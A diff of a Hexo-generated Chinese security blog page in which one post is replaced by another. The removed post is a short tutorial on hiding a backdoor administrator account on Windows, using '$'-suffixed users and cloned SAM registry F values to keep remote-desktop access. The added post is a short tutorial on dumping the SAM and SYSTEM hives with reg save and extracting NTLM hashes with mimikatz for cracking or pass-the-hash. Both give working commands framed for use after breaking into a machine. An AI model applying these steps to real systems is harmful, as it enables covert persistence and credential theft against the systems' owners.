@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.9.0">
   <meta charset="utf-8">
-  <title>Windows下两个隐藏后门用户的小技巧 | Sriracha :)</title>
-  <meta name="keywords" content=" 权限维持 ">
-  <meta name="description" content="Windows下两个隐藏后门用户的小技巧 | Sriracha :)">
+  <title>使用Mimikatz读取SAM和SYSTEM文件中的NTLM-HASH | Sriracha :)</title>
+  <meta name="keywords" content=" 内网渗透 ">
+  <meta name="description" content="使用Mimikatz读取SAM和SYSTEM文件中的NTLM-HASH | Sriracha :)">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta property="og:type" content="website">
 <meta property="og:title" content="Audit">
@@ -738,9 +738,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-Windows下两个隐藏后门用户的小技巧" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-使用Mimikatz读取SAM和SYSTEM文件中的NTLM-HASH" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">Windows下两个隐藏后门用户的小技巧</h1>
+        <h1 class="article-title">使用Mimikatz读取SAM和SYSTEM文件中的NTLM-HASH</h1>
     
     <div class="article-meta">
         
@@ -749,14 +749,14 @@
         
         <span class="tag">
             
-            <a class="color5">权限维持</a>
+            <a class="color5">内网渗透</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title='更新时间: 2020-01-13 12:49:20'>2019-11-06 20:20</time>
+        创建时间:<time class="date" title='更新时间: 2020-02-02 16:00:37'>2020-02-02 15:39</time>
         
     </div>
     <div class="article-meta">
@@ -778,7 +778,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#用户后面添加"><span class="toc-text">用户后面添加$</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#修改注册表"><span class="toc-text">修改注册表</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#使用场景"><span class="toc-text">使用场景</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#利用方式"><span class="toc-text">利用方式</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -794,15 +794,11 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>我们在渗透的过程中拿到权限之后想要植入后门(3389登陆)，net命令添加用户还是太明显了，无论是net user 或者登陆的时候都能看见我们创建的后门账号，今天碰巧看了篇实战文章，记录个留后门的小技巧<br><a id="more"></a></p>
-<h1 id="用户后面添加"><a href="#用户后面添加" class="headerlink" title="用户后面添加$"></a>用户后面添加$</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">net user defaultuser0$ somepasswordhere /add /y</span><br><span class="line">net localgroup administrators defaultuser0$ /add</span><br><span class="line">net localgroup &quot;remote desktop users&quot; defaultuser0$ /add</span><br></pre></td></tr></table></figure>
-<p>这样我们在net user的时候我们添加的用户就不会被显示出来了<br><img src="/2019/11/06/Windows下两个隐藏后门用户的小技巧/user.png" alt><br>不过在登陆的时候这个账号还是显示出来了<br><img src="/2019/11/06/Windows下两个隐藏后门用户的小技巧/login.png" alt></p>
-<h1 id="修改注册表"><a href="#修改注册表" class="headerlink" title="修改注册表"></a>修改注册表</h1><p>regedit打开注册表，然后找到HKEY_LOCAL_MACHINE\SAM\SAM,右键点击权限，将读写权限赋予 administrator<br><img src="/2019/11/06/Windows下两个隐藏后门用户的小技巧/sam.png" alt><br>重新打开注册表(这里不重新打开，sam目录下的内容无法展开)</p>
-<p>将 administrator 对应目录中的F值复制到后门用户对应目录中的F值<br><img src="/2019/11/06/Windows下两个隐藏后门用户的小技巧/f.png" alt><br>复制完成后，把 defaultuser0$ 和其对应的 0000003EC 目录导出并保存(这里不一定是3EC，具体你看你用户的类型)<br><img src="/2019/11/06/Windows下两个隐藏后门用户的小技巧/export.png" alt><br>然后删除刚才的后门用户</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user defaultuser0$ /del</span><br></pre></td></tr></table></figure>
-<p><img src="/2019/11/06/Windows下两个隐藏后门用户的小技巧/login_2.png" alt><br>这里defaultuser0$就没有了</p>
-<p>然后我们远程桌面连接，输入后门的账号密码就行了</p>
-<p>不过据说这两种方法都不是很安全，还待后续挖掘更多的后门小技巧</p>
+        <h1 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h1><p>已获取system权限，无法在目标机器上上传Mimikatz(有杀软或者限制啥的)，这个时候可以通过reg命令导出SAM和SYSTEM文件，离线读取出NTML HASH，其实也可以用procdump64和mimikatz抓取Windows用户密码，这个小技巧算是另外一种方式吧</p>
+<h1 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h1><p>首先导出两个文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg save hklm\sam sam.hive</span><br><span class="line">reg save hklm\system system.hive</span><br></pre></td></tr></table></figure></p>
+<p><img src="/2020/02/02/使用Mimikatz读取SAM和SYSTEM文件中的NTLM-HASH/1.png" alt><br>然后将这两个hive文件放到和Mimikatz同一个目录下，你可将目标机器的这两个文件拖出来到自己机器上尝试<br><img src="/2020/02/02/使用Mimikatz读取SAM和SYSTEM文件中的NTLM-HASH/2.png" alt><br>运行mimikatz，输入命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::sam /sam:sam.hive /system:system.hive</span><br></pre></td></tr></table></figure></p>
+<p><img src="/2020/02/02/使用Mimikatz读取SAM和SYSTEM文件中的NTLM-HASH/ntlm.png" alt><br>获取NTML后，我们对其进行解密，就随便找个稍微好用的解密网站就行，这里用cmd5进行解密<br><img src="/2020/02/02/使用Mimikatz读取SAM和SYSTEM文件中的NTLM-HASH/123456.png" alt></p>
+<p>解不出来，尝试hash传递吧！</p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 sher10cksec@foxmail.com </span>
@@ -812,12 +808,12 @@
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>Windows下两个隐藏后门用户的小技巧</p>
+    <p><span class="copy-title">文章标题:</span>使用Mimikatz读取SAM和SYSTEM文件中的NTLM-HASH</p>
     
     <p><span class="copy-title">本文作者:</span><a  title="sher10ck">sher10ck</a></p>
-    <p><span class="copy-title">发布时间:</span>2019-11-06, 20:20:56</p>
-    <p><span class="copy-title">最后更新:</span>2020-01-13, 12:49:20</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/2019/11/06/Windows下两个隐藏后门用户的小技巧/" title="Windows下两个隐藏后门用户的小技巧">http://yoursite.com/2019/11/06/Windows下两个隐藏后门用户的小技巧/</a>
+    <p><span class="copy-title">发布时间:</span>2020-02-02, 15:39:51</p>
+    <p><span class="copy-title">最后更新:</span>2020-02-02, 16:00:37</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/2020/02/02/使用Mimikatz读取SAM和SYSTEM文件中的NTLM-HASH/" title="使用Mimikatz读取SAM和SYSTEM文件中的NTLM-HASH">http://yoursite.com/2020/02/02/使用Mimikatz读取SAM和SYSTEM文件中的NTLM-HASH/</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
